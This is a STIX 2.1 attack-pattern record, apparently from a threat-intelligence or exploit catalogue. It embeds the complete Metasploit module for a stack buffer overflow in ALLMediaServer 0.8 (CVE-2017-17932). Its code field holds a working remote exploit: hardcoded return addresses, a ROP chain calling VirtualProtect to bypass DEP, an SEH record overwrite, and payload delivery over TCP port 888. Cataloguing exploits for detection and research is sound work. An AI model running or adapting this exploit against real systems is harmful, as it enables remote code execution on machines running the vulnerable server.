{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eaaa2423-230f-4035-b019-af35e2350f4a",
    "created": "2024-08-14T16:47:20.848092Z",
    "modified": "2024-08-14T16:47:20.848096Z",
    "name": "ALLMediaServer 0.8 Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in ALLMediaServer 0.8. The vulnerability is caused due to a boundary error within the handling of HTTP request.  While the exploit supports DEP bypass via ROP, on Windows 7 the stack pivoting isn't reliable across virtual (VMWare, VirtualBox) and physical environments. Because of this the module isn't using DEP bypass on the Windows 7 SP1 target, where by default DEP is OptIn and AllMediaServer won't run with DEP.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/allmediaserver_bof.rb",
            "external_id": "allmediaserver_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-17932"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ALLMediaServer 0.8 Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in ALLMediaServer 0.8. The vulnerability\n        is caused due to a boundary error within the handling of HTTP request.\n\n        While the exploit supports DEP bypass via ROP, on Windows 7 the stack pivoting isn't\n        reliable across virtual (VMWare, VirtualBox) and physical environments. Because of\n        this the module isn't using DEP bypass on the Windows 7 SP1 target, where by default\n        DEP is OptIn and AllMediaServer won't run with DEP.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'motaz reda <motazkhodair[at]gmail.com>',\t# Original discovery\n          'modpr0be <tom[at]spentera.com>',\t# Metasploit module\n          'juan vazquez' # More improvement\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2017-17932' ],\n          [ 'OSVDB', '83889' ],\n          [ 'EDB', '19625' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread', #none/process/thread/seh\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars' => \"\",\n          'Space' => 660,\n          'DisableNops' => true\n        },\n\n      'Targets'        =>\n        [\n          [ 'ALLMediaServer 0.8 / Windows XP SP3 - English',\n            {\n              'Ret'       =>\t0x65ec74dc, # ADD ESP,6CC # POP # POP # POP # RET - avcoded-53.dll\n              'OffsetRop' =>\t696,\n              'jmp'       =>\t264,\n              'Offset'    =>\t1072\n            }\n          ],\n          [ 'ALLMediaServer 0.8 / Windows 7 SP1 - English',\n            {\n              'Ret'       =>\t0x6ac5cc92, # ppr from avformat-53.dll\n              'Offset'    =>\t1072\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-07-04',\n      'DefaultTarget'  => 1))\n\n    register_options([Opt::RPORT(888)])\n\n  end\n\n  def junk(n=1)\n    return [rand_text_alpha(4).unpack(\"L\")[0]] * n\n  end\n\n  def nops(rop=false, n=1)\n    return rop ? [0x665a0aa1] * n : [0x90909090] * n\n  end\n\n  def asm(code)\n    Metasm::Shellcode.assemble(Metasm::Ia32.new, code).encode_string\n  end\n\n  def exploit\n    #with help from mona :)\n    rop = [\n      nops(true, 12),  #ROP NOP\n      0x65f6faa7,      # POP EAX # RETN\n      0x671ee4e0,      # ptr to &VirtualProtect()\n      0x6ac1ccb4,      # MOV EAX,DWORD PTR DS:[EAX] # RETN\n      0x667ceedf,      # PUSH EAX # POP ESI # POP EDI # RETN\n      junk,\n      0x65f5f09d,      # POP EBP # RETN\n      0x65f9830d,      # & call esp\n      0x6ac1c1d5,      # POP EBX # RETN\n      0x00000600,      # 0x00000320-> ebx\n      0x6672a1e2,      # POP EDX # RETN\n      0x00000040,      # 0x00000040-> edx\n      0x665a09df,      # POP ECX # RETN\n      0x6ad58a3d,      # &Writable location\n      0x6ac7a771,      # POP EDI # RETN\n      nops(true),      # RETN (ROP NOP)\n      0x6682f9f4,      # POP EAX # RETN\n      nops,            # nop\n      0x663dcbd2       # PUSHAD # RETN\n    ].flatten.pack(\"V*\")\n\n    connect\n\n    if target.name =~ /Windows 7/\n      buffer = rand_text(target['Offset'])\n      buffer << generate_seh_record(target.ret)\n      buffer << payload.encoded\n    else\n      buffer = rand_text(target['OffsetRop'])\t#junk\n      buffer << rop\n      buffer << asm(\"jmp $+0x#{target['jmp'].to_s(16)}\") # jmp to payload\n      buffer << rand_text(target['Offset'] - buffer.length)\n      buffer << generate_seh_record(target.ret)\n      buffer << payload.encoded\n    end\n\n    print_status(\"Sending payload to ALLMediaServer on #{target.name}...\")\n    sock.put(buffer)\n\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-04",
    "x_mitre_platforms": [
        "win'"
    ]
}